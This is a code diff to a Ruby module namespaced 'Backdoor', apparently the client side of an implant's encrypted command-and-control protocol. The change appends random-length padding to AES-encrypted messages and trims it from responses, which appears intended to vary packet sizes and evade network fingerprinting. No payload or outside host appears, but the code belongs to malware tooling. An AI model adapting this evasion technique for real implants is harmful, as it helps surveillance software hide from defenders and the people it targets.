@@ -75,11 +75,17 @@ module Command
     enc_msg = aes_encrypt(message, backdoor.signature)
     #trace "Auth -- signature: " << backdoor.signature.unpack('H*').to_s
     #trace "Auth -- enc_message: " << enc_msg.unpack('H*').to_s
-    
+
+    # add randomness to the packet size
+    enc_msg += randblock()
+
     # send the message and receive the response from the server
     # the transport layer will take care of the underlying cookie
     resp = @transport.message enc_msg
-    
+
+    # remove the random bytes at the end
+    resp = normalize(resp)
+
     # sanity check
     raise "wrong auth response length" unless resp.length == 64
     
@@ -142,6 +148,10 @@ module Command
     # send the message and receive the response from the server
     enc = aes_encrypt_integrity(message, @session_key)
     resp = @transport.message enc
+
+    # remove the random bytes at the end
+    resp = normalize(resp)
+
     resp = aes_decrypt_integrity(resp, @session_key)
     #trace "ID -- response: " << resp.unpack('H*').to_s
     
@@ -320,6 +330,10 @@ module Command
     enc_msg = aes_encrypt_integrity(message, @session_key)
     # send the message and receive the response
     resp = @transport.message enc_msg
+
+    # remove the random bytes at the end
+    resp = normalize(resp)
+
     resp = aes_decrypt_integrity(resp, @session_key)
 
     if resp.unpack('I') == [PROTO_OK] then
@@ -388,14 +402,29 @@ module Command
     
     # encrypt the message
     enc_msg = aes_encrypt_integrity(message, @session_key)
+    enc_msg += randblock()
 
     # send the message and receive the response
     resp = @transport.message enc_msg
 
+    # remove the random bytes at the end
+    resp = normalize(resp)
+
     # decrypt it
     return aes_decrypt_integrity(resp, @session_key)
   end
-  
+
+  # returns a random block of random size < 16
+  def randblock()
+    return SecureRandom.random_bytes(SecureRandom.random_number(16))
+  end
+
+  # normalize a message, cutting at the shorter size multiple of 16
+  def normalize(content)
+    newlen = content.length - (content.length % 16)
+    content[0..newlen-1]
+  end
+
 end
 
 end # Backdoor::
